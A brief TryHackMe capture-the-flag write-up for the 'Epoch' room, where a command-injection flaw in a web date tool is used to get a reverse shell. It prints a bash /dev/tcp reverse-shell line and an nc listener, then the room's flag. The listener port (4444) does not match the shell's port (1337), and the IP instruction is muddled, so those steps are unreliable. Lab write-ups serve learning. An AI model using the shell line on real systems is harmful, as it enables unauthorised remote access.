# EPOCH - TRYHACKME WRITEUP

![image.png](image.png)

BEFORE GOING TO ROOM LET’S UNDERSTAND

### Q. WHAT IS EPOCH?

> **Epoch** (in computing) refers to a **fixed point in time** used as the reference for all date/time calculations.
> 

In most systems, especially Unix/Linux, the **epoch** is:

📅 **January 1, 1970, 00:00:00 UTC**

🕰 All time is stored as the **number of seconds** that have passed since that moment.

### ROOM DESCRIPTION :

Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps! Wait... it doesn't need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!

Access this challenge by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the  "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: <YOUR_TARGET_MACHINE_IP>

### LET’S START

IN THIS ROOM THE WEBSITE GIVEN IS VULNERABLE AND WE HAVE TO FIND OUR FLAG.

THIS ROOM IS RELATED TO **COMMAND INJECTION** VULNERABLITY.

WE HAVE PAGE LIKE THIS

![image.png](image%201.png)

SO WHAT WE ARE GOING TO DO HERE IS GONNA GET A **REVERSE SHELL** ON OUR MACHINE.

WE NEED TO START LISTENING VIA NC ON PORT 4444 ON OUR MACHINE TO GET A **REVERSE SHELL**

```bash
nc -nvlp 4444
```

AND BASH REVERSE SHELL TO GET A REVERSE SHELL

```bash
/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1
```

NOTE: WE NEED TO USE OUR TARGET MACHINE IP ADDRESS AND OUR PORT NUMBER THAT WE ARE LISTENING VIA NC

AFTER GETTING A REVERSE SHELL.

WE CAN GET OUR FLAG IN ENVIRONMENT VARIABLES

WE CAN EXECUTE **printenv** 

AND WE WILL GET OUR FLAG

### flag{7da6c7debd40bd611560c13d8149b647}

**CONCLUSION** : IN THIS ROOM WE SOLVED THE COMMAND INJECTION VULNERABILITIES ON A VULNERABLE WEBSITE.